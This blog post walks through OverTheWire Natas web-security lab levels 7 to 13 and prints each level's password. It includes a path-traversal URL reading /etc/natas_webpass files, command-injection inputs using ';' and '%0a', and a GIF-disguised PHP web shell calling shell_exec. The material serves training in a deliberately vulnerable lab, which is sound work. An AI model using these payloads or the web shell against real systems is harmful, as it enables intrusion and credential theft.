+++
date = '2025-09-09T09:23:50+07:00'
title = 'OverTheWire Natas Walkthrough Levels 7 - 13'
tags = ['OverTheWire', 'CTFs']
description = 'Walkthrough of OverTheWire Natas levels 7 - 13 with step-by-step solutions, hints, and explanations for web security beginners.'
draft = false

[cover]
  image = '/images/posts/natas-cover.png' # path inside /static
  alt = 'Natas cover'
  caption = 'OverTheWire Natas'
  relative = false
+++

The Natas wargame is part of OverTheWire and focuses on web security challenges. This post covers Levels 7 – 13, with hints, answers, and explanations to help you understand the thought process, not just the final solution.

Each level introduces a new vulnerability — from basic HTML inspection to SQL injection, XSS, command injection, file inclusion, and authentication flaws. The goal is to find the password for the next level by analyzing and exploiting the web application.

## Natas Level 7 → Level 8
(Updated: 13 August 2025)

**Credentials**
- **Username:** `natas7`
- **Password:** `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`

**Connection**

Level url: [http://natas7.natas.labs.overthewire.org/](http://natas7.natas.labs.overthewire.org/)

**Steps to Solve**
1. Step 1 - You can access the code by doing the shortcut `Cmd + Shift + C` (for Mac) or `Ctrl + Shift + C` (for Windows)
2. Step 2 - You can see there is nothing else. But we find a message hint:
```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```
**In the URL, website is navigated by the ?page search query params, so try add the URL hint to the URL.**

3. Step 3 - Access [http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8](http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8) and you will see the password
4. Step 4 - Take the password to the next level.

**Next Level Password**

`xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`

---

## Natas Level 8 → Level 9
(Updated: 13 August 2025)

**Credentials**
- **Username:** `natas8`
- **Password:** `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`

**Connection**

Level url: [http://natas8.natas.labs.overthewire.org/](http://natas8.natas.labs.overthewire.org/)

**Steps to Solve**
1. Step 1 - You can access the code by doing the shortcut `Cmd + Shift + C` (for Mac) or `Ctrl + Shift + C` (for Windows)
2. Step 2 - You can see there is a `Input secret` so we have to find the secret, click `View sourcecode`, you'll find a PHP code:
```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
**Look at the code we have to decode the `secret` to its original to submit and get the password.**

3. Step 3 - Decode the secret using the terminal:
- Decode `bin2hex`:
```bash
echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p
> ==QcCtmMml1ViV3b
```
- Decode `strrev`:
```bash
echo "==QcCtmMml1ViV3b" | rev
> b3ViV1lmMmtCcQ==
```
- Decode `base64_encode`:
```bash
echo "b3ViV1lmMmtCcQ==" | base64 -d
> oubWYf2kBq
```
**=> The secret is: `oubWYf2kBq`**

4. Step 4 - Submit the secret to the `Input secret` to get the password.
5. Step 5 - Take the password to the next level.

**Next Level Password**

`ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`

---

## Natas Level 9 → Level 10
(Updated: 13 August 2025)

**Credentials**
- **Username:** `natas9`
- **Password:** `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`

**Connection**

Level url: [http://natas9.natas.labs.overthewire.org/](http://natas9.natas.labs.overthewire.org/)

**Steps to Solve**
1. Step 1 - You can access the code by doing the shortcut `Cmd + Shift + C` (for Mac) or `Ctrl + Shift + C` (for Windows)
2. Step 2 - You can see there is a `Search bar` so we have to do something with it to get the password. Let's `View sourcecode`
3. Step 3 - There is a PHP code:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
**So, it's using our input to get data in the `dictionary.txt` file. From there we absolutely can do some `command injeciton` to get the password.**

4. Step 4 - Add `test; cat /etc/natas_pass/natas10 #` to get the password.
- `;`: to end the first command and run the second.
- `#`: to ignore any code behind the `cat`.
5. Step 5 - Take the password to the next level.

**Next Level Password**

`t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

---

## Natas Level 10 → Level 11
(Updated: 13 August 2025)

**Credentials**
- **Username:** `natas10`
- **Password:** `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`

**Connection**

Level url: [http://natas10.natas.labs.overthewire.org/](http://natas10.natas.labs.overthewire.org/)

**Steps to Solve**
1. Step 1 - You can access the code by doing the shortcut `Cmd + Shift + C` (for Mac) or `Ctrl + Shift + C` (for Windows)
2. Step 2 - You can see there is a `Search bar` so we have to do something with it to get the password. Let's `View sourcecode`
3. Step 3 - Unlike level 9 this level has block `;` so we have to do something else. There is a PHP code:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
**We can try different method by using `%0a` in the terminal, to stimulate exactly like the `Enter` and gets the password.**

4. Step 4 - Add `needle=anything%0acat /etc/natas_webpass/natas11` to `needle` query params in the URL => [http://natas10.natas.labs.overthewire.org/?needle=anything%0acat%20/etc/natas_webpass/natas11&submit=Search](http://natas10.natas.labs.overthewire.org/?needle=anything%0acat%20/etc/natas_webpass/natas11&submit=Search) and get the password.
- It will run 2 separate commands:
    - `grep -i anything dictionary.txt`
    - `cat /etc/natas_webpass/natas11`
5. Step 5 - Take the password to the next level.

**Next Level Password**

`UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`

---

## Natas Level 11 → Level 12
(Updated: 13 August 2025)

**Credentials**
- **Username:** `natas11`
- **Password:** `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`

**Connection**

Level url: [http://natas11.natas.labs.overthewire.org/](http://natas11.natas.labs.overthewire.org/)

**Steps to Solve**
Take a look at:
- https://learnhacking.io/overthewire-natas-level-11-walkthrough/

**Next Level Password**

`yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`

---

## Natas Level 12 → Level 13
(Updated: 13 August 2025)

**Credentials**
- **Username:** `natas12`
- **Password:** `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`

**Connection**

Level url: [http://natas12.natas.labs.overthewire.org/](http://natas12.natas.labs.overthewire.org/)

**Steps to Solve**
Take a look at:
- https://learnhacking.io/overthewire-natas-level-12-walkthrough/

**Next Level Password**

`trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`

---

## Natas Level 13 → Level 14
(Updated: 13 August 2025)

**Credentials**
- **Username:** `natas13`
- **Password:** `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`

**Connection**

Level url: [http://natas13.natas.labs.overthewire.org/](http://natas13.natas.labs.overthewire.org/)

**Steps to Solve**
1. Step 1 - Just like the previous level we have to use the image uploading to access to shell and `cat` the password. However, this level has blocked `.php` file (or others that isn't image).
2. Step 2 - Create a `shell.php` with this content:
```php
GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```
- `GIF87`: is a magic header that maked the server thinks this is a `.gif` file (but it is a `.php`).
3. Step 3 - Use `DevTools` and change the exec type of the uploaded file to `.php`.
4. Step 4 - Upload the `shell.php` we created and access to [http://natas13.natas.labs.overthewire.org/upload/rn81hkpyec.php?e=cat%20/etc/natas_webpass/natas14](http://natas13.natas.labs.overthewire.org/upload/rn81hkpyec.php?e=cat%20/etc/natas_webpass/natas14) to get the password.
5. Step 5 - Take the password to the next level.

**Next Level Password**

`z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
